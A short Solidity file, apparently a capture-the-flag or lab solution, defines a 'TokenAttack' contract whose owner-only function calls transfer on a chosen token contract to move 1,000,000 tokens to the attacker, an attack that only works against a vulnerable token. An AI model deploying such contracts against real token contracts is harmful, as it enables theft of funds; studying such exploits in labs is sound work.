//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

contract Token {
    function transfer(address _to, uint _value) public returns (bool) { }
}

contract TokenAttack is Owner {

    Token tokenContract;
    address owner;

    constructor () {
        owner = msg.sender;
    }

    function setTokenContract (address _contract) external isOwner {
        tokenContract = Token(_contract);
    }

    function attackTokenContract () external isOwner { 
        tokenContract.transfer(owner, 1000000);
    }
}